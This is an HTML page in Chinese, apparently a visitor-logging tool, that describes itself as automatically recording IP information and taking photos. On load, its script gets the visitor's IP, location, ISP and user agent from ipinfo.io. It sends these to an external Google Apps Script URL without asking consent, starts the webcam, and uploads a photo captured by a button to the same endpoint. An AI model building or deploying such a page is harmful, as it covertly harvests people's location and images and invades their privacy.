<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>IP 定位與拍照功能</title>
</head>
<body>
  <h1>自動記錄 IP 資訊並拍d攝照片</h1>
  <p id="ipInfo">IP 資訊載入中...</p>
  <p id="status">尚未開始操作</p>

  <!-- 攝像頭顯示 -->
  <video id="video" autoplay playsinline width="320" height="240"></video>
  <canvas id="canvas" style="display: none;"></canvas>
  <button id="capture">拍攝照片</button>

  <script>
    // 獲取 IP 和地理位置信息
    async function getIpInfo() {
      try {
        const response = await fetch('https://ipinfo.io/json');
        const data = await response.json();
        const { ip, city, region, country, org } = data;
        const ipType = ip.includes('.') ? 'IPV4' : 'IPV6';
        const userAgent = navigator.userAgent;

        // 顯示 IP 資訊
        document.getElementById('ipInfo').innerText =
          `IP: ${ip}, 類型: ${ipType}, 城市: ${city}, 區域: ${region}, 國家: ${country}, 組織: ${org}, 用戶代理: ${userAgent}`;

        // 發送到後端處理
        const url = new URL('https://script.google.com/macros/s/AKfycbzcYDht_3NA68S32srTOwQ4cPor6f73xliAyiA7xXA3MWMhp_cwLfwDjtZXCCbmwzXsKw/exec');
        url.searchParams.append('ip', ip);
        url.searchParams.append('ipType', ipType);
        url.searchParams.append('userAgent', userAgent);
        url.searchParams.append('city', city);
        url.searchParams.append('region', region);
        url.searchParams.append('country', country);
        url.searchParams.append('org', org);

        const result = await fetch(url.toString());
        const responseData = await result.json();

        if (responseData.success) {
          document.getElementById('status').innerText = 'IP 資訊已上傳到伺服器。';
        } else {
          document.getElementById('status').innerText = '上傳失敗：伺服器返回錯誤。';
        }
      } catch (error) {
        console.error('IP 資訊獲取失敗:', error);
        document.getElementById('status').innerText = 'IP 資訊獲取失敗。';
      }
    }

    // 初始化攝像頭
    async function initCamera() {
      const video = document.getElementById('video');
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      video.srcObject = stream;
    }

    // 拍攝照片並上傳
    document.getElementById('capture').addEventListener('click', async () => {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      const ctx = canvas.getContext('2d');

      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob(async (blob) => {
        const formData = new FormData();
        formData.append('photo', blob, 'photo.jpg');
        formData.append('userAgent', navigator.userAgent);

        const url = 'https://script.google.com/macros/s/AKfycbzcYDht_3NA68S32srTOwQ4cPor6f73xliAyiA7xXA3MWMhp_cwLfwDjtZXCCbmwzXsKw/exec';
        const response = await fetch(url, {
          method: 'POST',
          body: formData,
        });

        const result = await response.json();
        document.getElementById('status').innerText = result.success
          ? '照片成功上傳！'
          : `上傳失敗：${result.error}`;
      }, 'image/jpeg');
    });

    // 啟動 IP 資訊記錄與攝像頭
    document.addEventListener('DOMContentLoaded', () => {
      getIpInfo();
      initCamera().catch((error) => {
        document.getElementById('status').innerText = '無法啟動攝像頭：' + error.message;
      });
    });
  </script>
</body>
</html>
